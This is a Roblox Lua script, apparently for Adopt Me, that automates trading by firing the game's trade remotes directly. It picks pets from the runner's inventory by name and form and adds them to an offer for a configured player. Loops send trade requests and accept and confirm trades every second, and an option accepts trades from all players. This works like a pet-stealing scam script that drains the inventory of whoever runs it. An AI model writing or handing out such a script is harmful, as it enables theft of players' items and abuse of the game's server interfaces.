local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- ================= CONFIGURATION =================
MainAccUsername = {"Her0eXBuildera31"} 
TARGET_ITEM_NAME = "retired_egg"
TARGET_ITEM_FORM = "NORMAL" -- NORMAL, NEON, or MEGA_NEON
ForceReceiver = false 

targetFrameName = {"Dialog", "Frametest2", "Frametest3"}
-- =================================================

local addItemRemote = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AddItemToOffer")
local sendTradeRemote = ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)
local tradeFunction = ReplicatedStorage:WaitForChild("API"):WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")
local API = ReplicatedStorage:WaitForChild("API")

local successClientData, ClientData = pcall(function()
	return require(ReplicatedStorage:WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
end)

local function getSelectedUniqueIds()
	local selectedIds = {}
	if type(_G.SelectedPetIds) ~= "table" or not successClientData or not ClientData then
		return selectedIds
	end

	local dataStore = ClientData.get_data()
	local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
	local pets = playerData and playerData.inventory and playerData.inventory.pets
	if not pets then
		return selectedIds
	end

	for uniqueId, isSelected in pairs(_G.SelectedPetIds) do
		if isSelected and pets[uniqueId] then
			table.insert(selectedIds, uniqueId)
		end
	end
	return selectedIds
end

local function getMultipleUniqueIdsByName(itemName, itemForm, limit)
	if not successClientData or not ClientData then
		return {}
	end

	local dataStore = ClientData.get_data()
	local playerData = dataStore and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])
	
	if not playerData or not playerData.inventory or not playerData.inventory.pets then
		return {}
	end

	local uniqueIds = {}
	for uniqueId, itemData in pairs(playerData.inventory.pets) do
		if itemData and itemData.kind == itemName then
			local properties = itemData.properties or {}
			local isNeon = properties.neon == true
			local isMegaNeon = properties.mega_neon == true
			local matchesForm = itemForm == "NEON" and isNeon and not isMegaNeon
				or itemForm == "MEGA_NEON" and isMegaNeon
				or itemForm == "NORMAL" and not isNeon and not isMegaNeon

			if matchesForm then
				table.insert(uniqueIds, uniqueId)
				if #uniqueIds >= limit then
					break
				end
			end
		end
	end
	return uniqueIds
end

local function sendTradeRequest(playerName)
	local targetPlayer = Players:FindFirstChild(playerName)
	if not targetPlayer then
		return false
	end
	
	if sendTradeRemote and sendTradeRemote:IsA("RemoteEvent") then
		local success = pcall(function()
			sendTradeRemote:FireServer(targetPlayer)
		end)
		if success then
			task.wait(5)
			return true
		end
	end

	return false
end

local function acceptTradeForAll()
	for _, targetPlayer in ipairs(Players:GetPlayers()) do
		if targetPlayer ~= Players.LocalPlayer then
			local args = {
				targetPlayer,
				true
			}

			local success, err = pcall(function()
				return tradeFunction:InvokeServer(unpack(args))
			end)
		end
	end
end

task.spawn(function()
	while true do
		if _G.TradeLoopRunning and _G.TradeLoopPlayerName and Players:FindFirstChild(_G.TradeLoopPlayerName) then
			local uniqueIds = getSelectedUniqueIds()
			if #uniqueIds == 0 then
				uniqueIds = getMultipleUniqueIdsByName(TARGET_ITEM_NAME, TARGET_ITEM_FORM, 18)
			end

			for _, uniqueId in ipairs(uniqueIds) do
				pcall(function()
					addItemRemote:FireServer(uniqueId)
				end)
			end
		end

		task.wait(1)
	end
end)

task.spawn(function()
	while true do
		if _G.TradeLoopRunning and _G.TradeLoopPlayerName then
			sendTradeRequest(_G.TradeLoopPlayerName)
		end

		if ForceReceiver then
			acceptTradeForAll()
		end

		task.wait(1)
	end
end)


-- Cache the remotes once
local AcceptNeg = API:WaitForChild("TradeAPI/AcceptNegotiation")
local ConfirmTrade = API:WaitForChild("TradeAPI/ConfirmTrade")

local function RunTradeAutomation()
    while true do
		AcceptNeg:FireServer()
		ConfirmTrade:FireServer()
        task.wait(1) -- Wait 1 second before the next loop
    end
end

-- Start the loop in the background
task.spawn(RunTradeAutomation)
